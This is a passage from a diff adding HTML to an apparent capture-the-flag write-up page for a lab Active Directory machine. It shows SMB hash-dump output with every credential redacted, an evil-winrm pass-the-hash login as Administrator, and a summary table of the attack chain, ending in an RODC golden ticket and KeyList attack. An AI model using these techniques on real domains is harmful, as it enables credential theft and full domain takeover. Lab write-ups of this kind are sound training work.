+SMB  DC01  Administrator:500:...:<span class="cred" onclick="showTroll()">&#128274; REDACTED</span>:::
+SMB  DC01  krbtgt:502:...:<span class="cred" onclick="showTroll()">&#128274; REDACTED</span>:::
+SMB  DC01  garfield.htb\j.arbuckle:3101:...:<span class="cred" onclick="showTroll()">&#128274; REDACTED</span>:::
+SMB  DC01  garfield.htb\l.wilson:3105:...:<span class="cred" onclick="showTroll()">&#128274; REDACTED</span>:::
+SMB  DC01  garfield.htb\l.wilson_adm:3107:...:<span class="cred" onclick="showTroll()">&#128274; REDACTED</span>:::</code></pre>
+
+      <pre data-label="bash"><code><span class="c-green">$</span> evil-winrm -i 10.129.xx.xx -u Administrator -H '<span class="cred" onclick="showTroll()">&#128274; REDACTED</span>'</code></pre>
+
+      <div class="success-box">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt<br><span class="cred" onclick="showTroll()">&#128274; REDACTED</span></div>
+
+    </div>
+  </div>
+
+  <!-- ══════ VULN SUMMARY ══════ -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num blue">i</div>
+      <div class="section-title">Vulnerability Summary</div>
+    </div>
+    <div class="section-body">
+      <table>
+        <tr><th>Misconfiguration</th><th>Component</th><th>Impact</th></tr>
+        <tr><td>scriptPath WRITE (ACL)</td><td>l.wilson AD object</td><td>Arbitrary code execution as l.wilson via malicious SYSVOL logon script</td></tr>
+        <tr><td>ForceChangePassword (ACL)</td><td>l.wilson_adm AD object</td><td>Password reset without knowing current credential &#8594; WinRM access</td></tr>
+        <tr><td>msDS-AllowedToActOnBehalfOfOtherIdentity WRITE</td><td>RODC01 computer object</td><td>RBCD &#8594; impersonate Administrator to RODC01 &#8594; SYSTEM</td></tr>
+        <tr><td>RODC Golden Ticket + KeyList Attack</td><td>krbtgt_8245 / RODC replication policy</td><td>Forge RODC TGT &#8594; DC01 issues real Administrator TGS &#8594; full domain compromise</td></tr>
+      </table>
+    </div>
+  </div>
+
+</div>
+
+<div id="troll-modal" style="display:
